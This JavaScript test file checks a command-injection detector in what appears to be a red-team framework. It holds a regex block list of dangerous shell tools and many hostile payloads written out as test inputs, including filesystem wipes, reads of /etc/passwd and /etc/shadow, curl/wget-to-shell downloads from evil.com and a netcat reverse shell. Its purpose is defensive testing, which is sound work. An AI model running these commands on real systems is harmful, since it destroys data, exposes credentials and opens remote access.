/**
 * 命令注入攻击测试
 * 模拟各种命令注入攻击向量
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import RedTeamFramework, { AttackVectors } from './red-team-framework.js';
import { exec, execSync } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

describe('命令注入攻击测试', () => {
  let redTeam;

  beforeEach(() => {
    redTeam = new RedTeamFramework();

    // 注册命令注入攻击向量
    redTeam.registerAttack(AttackVectors.COMMAND_INJECTION, async (payload) => {
      try {
        // 模拟危险的命令执行
        const command = buildCommand(payload);
        const isInjection = detectCommandInjection(payload.input);

        if (isInjection) {
          return {
            success: true,
            blocked: true,
            details: {
              command: command,
              detected: true,
              injectionType: payload.injectionType,
              input: payload.input
            }
          };
        }

        // 尝试安全执行命令
        const result = await safeExecuteCommand(command);

        return {
          success: false,
          blocked: true,
          details: {
            command: command,
            result: result,
            detected: false,
            safe: true
          }
        };
      } catch (error) {
        return {
          success: false,
          blocked: true,
          details: {
            error: error.message,
            command: payload.command,
            safe: false
          }
        };
      }
    });
  });

  afterEach(() => {
    redTeam.cleanup();
  });

  // 构建命令字符串
  function buildCommand(payload) {
    const baseCommand = payload.baseCommand || 'echo';
    const input = payload.input || '';

    // 模拟常见的命令注入场景
    switch (payload.injectionType) {
      case 'shell_exec':
        return `${baseCommand} ${input}`;
      case 'popen':
        return `${baseCommand} "${input}"`;
      case 'system':
        return `${baseCommand} ${input}`;
      case 'eval':
        return `eval "${input}"`;
      default:
        return `${baseCommand} ${input}`;
    }
  }

  // 检测命令注入
  function detectCommandInjection(input) {
    if (!input) return false;

    const injectionPatterns = [
      /;/,
      /\|/,
      /&/,
      /\$\(/,
      /`/,
      /\$\{/,
      /\$\w+/,
      /rm\s+-rf/,
      /format\s+c:/,
      /del\s+.*\*/,
      /shutdown/,
      /reboot/,
      /halt/,
      /poweroff/,
      /wget\s+.*\|\s*sh/,
      /curl\s+.*\|\s*sh/,
      /nc\s+.*-e/,
      /netcat\s+.*-e/,
      /bash\s+-i/,
      /sh\s+-i/,
      /python\s+-c/,
      /perl\s+-e/,
      /php\s+-r/,
      /node\s+-e/
    ];

    return injectionPatterns.some(pattern => pattern.test(input));
  }

  // 安全执行命令（模拟）
  async function safeExecuteCommand(command) {
    // 在测试环境中，我们不真正执行危险命令
    // 只返回模拟结果
    if (detectCommandInjection(command)) {
      throw new Error('Command injection detected');
    }

    // 模拟安全的命令执行
    return {
      stdout: 'Command executed safely',
      stderr: '',
      exitCode: 0
    };
  }

  describe('基本命令注入攻击', () => {
    it('应该阻止分号注入', async () => {
      const payload = {
        input: 'hello; rm -rf /',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止管道注入', async () => {
      const payload = {
        input: 'hello | cat /etc/passwd',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止命令替换注入', async () => {
      const payload = {
        input: 'hello $(cat /etc/passwd)',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止反引号注入', async () => {
      const payload = {
        input: 'hello `whoami`',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });
  });

  describe('系统命令注入', () => {
    it('应该阻止rm -rf注入', async () => {
      const payload = {
        input: 'test && rm -rf /',
        injectionType: 'system',
        baseCommand: 'ls'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止shutdown注入', async () => {
      const payload = {
        input: 'test; shutdown -h now',
        injectionType: 'system',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止reboot注入', async () => {
      const payload = {
        input: 'test | reboot',
        injectionType: 'system',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });
  });

  describe('网络命令注入', () => {
    it('应该阻止wget下载执行注入', async () => {
      const payload = {
        input: 'test && wget http://evil.com/malware | sh',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止curl下载执行注入', async () => {
      const payload = {
        input: 'test; curl http://evil.com/shell | bash',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止反向shell注入', async () => {
      const payload = {
        input: 'test && nc evil.com 4444 -e /bin/sh',
        injectionType: 'system',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });
  });

  describe('脚本语言注入', () => {
    it('应该阻止Python代码注入', async () => {
      const payload = {
        input: 'test && python -c "import os; os.system(\'rm -rf /\')"',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止Node.js代码注入', async () => {
      const payload = {
        input: 'test; node -e "require(\'fs\').rmdirSync(\'/\', {recursive: true})"',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止PHP代码注入', async () => {
      const payload = {
        input: 'test | php -r "system(\'rm -rf /\');"',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });
  });

  describe('文件操作注入', () => {
    it('应该阻止文件删除注入', async () => {
      const payload = {
        input: 'test && rm -rf /home/user/*',
        injectionType: 'system',
        baseCommand: 'ls'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止文件覆盖注入', async () => {
      const payload = {
        input: 'test > /etc/passwd',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止文件读取注入', async () => {
      const payload = {
        input: 'test && cat /etc/shadow',
        injectionType: 'system',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });
  });

  describe('绕过技术测试', () => {
    it('应该阻止使用空格绕过', async () => {
      const payload = {
        input: 'test&&rm -rf /',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止使用制表符绕过', async () => {
      const payload = {
        input: 'test\t&&\trm\t-rf\t/',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });

    it('应该阻止使用换行符绕过', async () => {
      const payload = {
        input: 'test\nrm -rf /',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);

      expect(result.blocked).toBe(true);
      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });
  });

  describe('批量命令注入测试', () => {
    const injectionPayloads = [
      { input: 'test; rm -rf /', injectionType: 'shell_exec' },
      { input: 'test && shutdown -h now', injectionType: 'system' },
      { input: 'test | nc evil.com 4444 -e /bin/sh', injectionType: 'shell_exec' },
      { input: 'test && wget http://evil.com/shell | sh', injectionType: 'system' },
      { input: 'test; python -c "import os; os.system(\'rm -rf /\')"', injectionType: 'shell_exec' },
      { input: 'test && node -e "require(\'fs\').rmdirSync(\'/\')"', injectionType: 'system' },
      { input: 'test | php -r "system(\'rm -rf /\');"', injectionType: 'shell_exec' },
      { input: 'test && curl http://evil.com/malware | bash', injectionType: 'system' },
      { input: 'test; format c:', injectionType: 'shell_exec' },
      { input: 'test && del *.* /s /q', injectionType: 'system' }
    ];

    it.each(injectionPayloads)('应该检测到命令注入: %j', async (payload) => {
      const fullPayload = { ...payload, baseCommand: 'echo' };
      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, fullPayload);

      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
    });
  });

  describe('性能测试', () => {
    it('应该快速检测命令注入', async () => {
      const payload = {
        input: 'test; rm -rf /',
        injectionType: 'shell_exec',
        baseCommand: 'echo'
      };

      const startTime = performance.now();
      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
      const endTime = performance.now();

      expect(result.success).toBe(true);
      expect(result.details.detected).toBe(true);
      expect(endTime - startTime).toBeLessThan(5); // 应该在5ms内检测
    });
  });
});
